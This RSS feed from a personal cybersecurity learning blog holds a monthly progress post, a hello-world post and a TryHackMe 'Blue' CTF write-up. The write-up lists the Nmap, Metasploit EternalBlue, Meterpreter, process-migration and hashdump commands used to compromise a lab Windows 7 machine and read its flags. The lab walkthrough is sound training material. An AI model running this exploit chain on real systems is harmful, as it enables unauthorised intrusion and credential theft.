<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Nod&#39;s Notes</title>
        <link>http://localhost:1313/posts/</link>
        <description>Recent content in Posts on Nod&#39;s Notes</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Thu, 30 Jan 2025 16:51:40 +1100</lastBuildDate>
        <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>The Monthly Patch 2025.01</title>
            <link>http://localhost:1313/posts/2025/01/the-monthly-patch-2025.01/</link>
            <pubDate>Thu, 30 Jan 2025 16:51:40 +1100</pubDate>
            
            <guid>http://localhost:1313/posts/2025/01/the-monthly-patch-2025.01/</guid>
            <description>The Monthly Patch 2025.01 Welcome to The Monthly Patch, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:
To serve as a motivational tool—tracking my progress and pushing myself to continuously improve. To provide a transparent record of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth. Each month, I&amp;rsquo;ll cover my progress, learning experiences, projects, and future goals.</description>
            <content type="html"><![CDATA[<h1 id="the-monthly-patch-202501"><strong>The Monthly Patch 2025.01</strong></h1>
<p>Welcome to <strong>The Monthly Patch</strong>, a new blog series where I document my cybersecurity journey, both personal and professional. My goal with this blog is twofold:</p>
<ol>
<li>To serve as a <strong>motivational tool</strong>—tracking my progress and pushing myself to continuously improve.</li>
<li>To provide a <strong>transparent record</strong> of my learning journey—allowing potential employers and like-minded professionals to see my dedication to cybersecurity growth.</li>
</ol>
<p>Each month, I&rsquo;ll cover my progress, learning experiences, projects, and future goals. Now, let&rsquo;s dive into <strong>January 2025</strong>!</p>
<hr>
<h2 id="-wrapping-up-2024-my-cybersecurity-milestone"><strong>📜 Wrapping Up 2024: My Cybersecurity Milestone</strong></h2>
<p>December 2024 was a <strong>major milestone</strong> for me—I officially <strong>graduated with a Diploma of Cybersecurity with Distinction</strong>, achieving a <strong>GPA of 6.5</strong>. This was a huge accomplishment after a full year of intense study.</p>
<p>To celebrate, I took the rest of December off to <strong>spend time with family, unwind, and recharge</strong> after a demanding academic year.</p>
<hr>
<h2 id="-january-the-job-hunt-begins"><strong>🚀 January: The Job Hunt Begins</strong></h2>
<p>With the new year in full swing, I shifted my focus to landing a cybersecurity role. This month, I:</p>
<ul>
<li><strong>Refined my resume</strong> and <strong>updated my LinkedIn</strong> and other job-seeking profiles.</li>
<li><strong>Applied for around 40 jobs</strong> in cybersecurity-related fields. While this isn’t a massive number, I wanted to <strong>prioritise quality over quantity</strong>—tailoring applications for roles that align with my interests and skillset.</li>
<li>My goal for <strong>February</strong> is to <strong>increase applications</strong> while securing interviews and, ideally, receiving offers.</li>
</ul>
<hr>
<h2 id="-getting-back-to-hands-on-learning"><strong>💻 Getting Back to Hands-On Learning</strong></h2>
<p>Now that my formal studies are complete, I’m <strong>returning to TryHackMe</strong> to continue upskilling. Specifically, I aim to:</p>
<p>✅ <strong>Complete the SOC Level 1 Learning Path</strong> before the end of February.</p>
<p>I’ve also started the <strong>Google Cybersecurity Certificate on Coursera</strong>. Although it’s structured as a 3–6 month program (at 7 hours per week), I believe my existing knowledge will allow me to <strong>fast-track my progress and complete it in February</strong>.</p>
<hr>
<h2 id="-expanding-my-knowledge-base"><strong>📝 Expanding My Knowledge Base</strong></h2>
<p>I’ve been maintaining cybersecurity notes in <strong>Obsidian</strong>, and I plan to:</p>
<ul>
<li>Continue <strong>expanding my notes</strong> with key concepts, attack techniques, and defensive strategies.</li>
<li>Explore <strong>alternative platforms</strong> in case I find a more efficient solution for managing and organizing my cybersecurity knowledge.</li>
</ul>
<hr>
<h2 id="-staying-up-to-date-with-industry-trends"><strong>🌍 Staying Up to Date with Industry Trends</strong></h2>
<p>Keeping up with industry developments is crucial, so I’ve been:</p>
<ul>
<li><strong>Watching Simply Cyber&rsquo;s Daily Cyber Threat Brief</strong> with Gerald Auger to stay informed on real-world cybersecurity threats.</li>
<li>Exploring <strong>SIEM lab projects</strong>, inspired by one of Gerald Auger’s videos on <strong>building a home SIEM setup</strong> to practice detecting, analyzing, and responding to security events.</li>
</ul>
<p>My plan for <strong>February</strong> is to <strong>set up a SIEM lab</strong> in my home lab environment, so I can better understand <strong>log analysis, alerts, and security monitoring</strong>.</p>
<hr>
<h2 id="-looking-ahead-february-2025-goals"><strong>🎯 Looking Ahead: February 2025 Goals</strong></h2>
<p>🔥 <strong>Increase job applications and secure interviews.</strong><br>
🔥 <strong>Complete the TryHackMe SOC Level 1 Learning Path.</strong><br>
🔥 <strong>Finish the Google Cybersecurity Certificate on Coursera.</strong><br>
🔥 <strong>Build a SIEM lab in my home environment.</strong><br>
🔥 <strong>Continue expanding and refining my knowledge base.</strong></p>
<p>Wrapping up, I feel a <strong>strong sense of accomplishment</strong> from graduating in December, but I know <strong>this is just the beginning</strong>. Cybersecurity is a field of continuous learning, and I’m excited for the next steps in my journey.</p>
<p>Let’s make February a productive month! 💪</p>
]]></content>
        </item>
        
        <item>
            <title>CTF Blue THM</title>
            <link>http://localhost:1313/posts/2024/07/ctf-blue-thm/</link>
            <pubDate>Mon, 22 Jul 2024 18:42:43 +1000</pubDate>
            
            <guid>http://localhost:1313/posts/2024/07/ctf-blue-thm/</guid>
            <description>TryHackMe CTF: Blue Room Writeup
https://tryhackme.com/r/room/blue
Room Information
This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.
Initial Scanning
I started by running an Nmap scan on the target IP address:
sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233 The Nmap scan revealed several open ports:</description>
            <content type="html"><![CDATA[<p><strong>TryHackMe CTF: Blue Room Writeup</strong><br>
<a href="https://tryhackme.com/r/room/blue">https://tryhackme.com/r/room/blue</a><br>
<strong>Room Information</strong></p>
<p>This room was created by ben and DarkStar7471, members of the TryHackMe community. This is my second CTF, and I will document my thought process and actions as I go through the challenges.</p>
<p><strong>Initial Scanning</strong></p>
<p>I started by running an Nmap scan on the target IP address:</p>
<pre tabindex="0"><code>sudo nmap -sC -sV -p- -T4 -vv 10.10.216.233
</code></pre><p>The Nmap scan revealed several open ports:</p>
<pre tabindex="0"><code>PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
</code></pre><p>After reviewing the results, I noticed three ports below 1000, which answered one of the CTF questions.</p>
<p>Given the machine is running Windows 7 Professional with SMB service on port 445, I inferred it could be vulnerable to the MS17-010 (EternalBlue) exploit.</p>
<p><strong>Exploitation with Metasploit</strong></p>
<p>To exploit this vulnerability, I launched Metasploit and searched for the appropriate module.</p>
<pre tabindex="0"><code>msfconsole
search exploit/windows/smb/ms17_010_eternalblue
</code></pre><p>The search returned the module I needed, so I proceeded to use it.</p>
<pre tabindex="0"><code>use exploit/windows/smb/ms17_010_eternalblue
</code></pre><p>Next, I configured the necessary options:</p>
<pre tabindex="0"><code>show options
set LHOST &lt;My_IP&gt;
set RHOSTS 10.10.216.233
</code></pre><p>I then ran the exploit.</p>
<pre tabindex="0"><code>run
</code></pre><p>The exploit was successful, and I gained a command shell on the target machine:</p>
<pre tabindex="0"><code>[*] Command shell session 1 opened (My_IP:4444 -&gt; 10.10.216.233:49242)
</code></pre><p><strong>Upgrading to Meterpreter</strong></p>
<p>To enhance my capabilities on the target, I decided to upgrade the shell to a Meterpreter session. After some research, I found that Metasploit offers a module for this purpose.</p>
<pre tabindex="0"><code>background
search post/multi/manage/shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
</code></pre><p>I checked the required options and set them accordingly:</p>
<pre tabindex="0"><code>show options
set SESSION 1
set LHOST &lt;Your_IP&gt;
set LPORT 4433
run
</code></pre><p>I confirmed the Meterpreter session:</p>
<pre tabindex="0"><code>sessions -l
</code></pre><p><strong>Privilege Escalation and Flag Discovery</strong></p>
<p>With the Meterpreter session active, I listed the running processes and selected a system-level process for migration to gain higher privileges.</p>
<pre tabindex="0"><code>ps
migrate &lt;PID&gt;
</code></pre><p>Having escalated privileges, I proceeded to dump the password hashes:</p>
<pre tabindex="0"><code>hashdump
</code></pre><p>I used CrackStation to crack the hashes and retrieved the user credentials which was required as a question on the CTF.</p>
<p>I was then asked to locate 3 flags on the system.</p>
<p><strong>Flag 1</strong></p>
<p>The CTF mentioned the first flag is located at the system root. I navigated to the C:\ drive and located first flag.</p>
<pre tabindex="0"><code>meterpreter &gt; cd C:\
meterpreter &gt; ls
meterpreter &gt; cat flag1.txt
flag{access_the_machine}
</code></pre><p>Knowing that the first flag was named flag1.txt I assumed flag 2 and 3 would follow the same naming convention.</p>
<p>I then decided to use the search function to find flags 2 and 3.</p>
<p><strong>Flag 2</strong></p>
<p>The second flag is located where Windows stores passwords. I utilised the search function to find it:</p>
<pre tabindex="0"><code>meterpreter &gt; search -f flag2.txt
Found 1 result...

c:\Windows\System32\config\flag2.txt
</code></pre><p>I navigated to the directory and viewed the contents:</p>
<pre tabindex="0"><code>meterpreter &gt; cat c:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
</code></pre><p><strong>Flag 3</strong></p>
<p>The third flag is located in the user’s documents. Again, I used the search function:</p>
<pre tabindex="0"><code>meterpreter &gt; search -f flag3.txt
Found 1 result...

c:\Users\Jon\Documents\flag3.txt
</code></pre><p>I navigated to the directory and viewed the contents:</p>
<pre tabindex="0"><code>meterpreter &gt; cat c:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
</code></pre><p><strong>Conclusion</strong></p>
<p>This CTF was an excellent learning experience. Running through the Nmap scan helped me identify the open ports and potential vulnerabilities. Utilising Metasploit to exploit the MS17-010 vulnerability and upgrading to a Meterpreter session provided valuable practice in exploiting and navigating a Windows system. Retrieving the flags reinforced my skills in locating sensitive information within a compromised machine. I look forward to tackling more CTF challenges in the future.</p>
]]></content>
        </item>
        
        <item>
            <title>Hello World.</title>
            <link>http://localhost:1313/posts/2024/07/hello-world./</link>
            <pubDate>Mon, 15 Jul 2024 14:09:52 +1000</pubDate>
            
            <guid>http://localhost:1313/posts/2024/07/hello-world./</guid>
            <description>Welcome to my blog! This initial post serves as a test to ensure everything is functioning correctly. Stay tuned for more updates and content.</description>
            <content type="html"><![CDATA[<p>Welcome to my blog! This initial post serves as a test to ensure everything is functioning correctly. Stay tuned for more updates and content.</p>
]]></content>
        </item>
        
    </channel>
</rss>
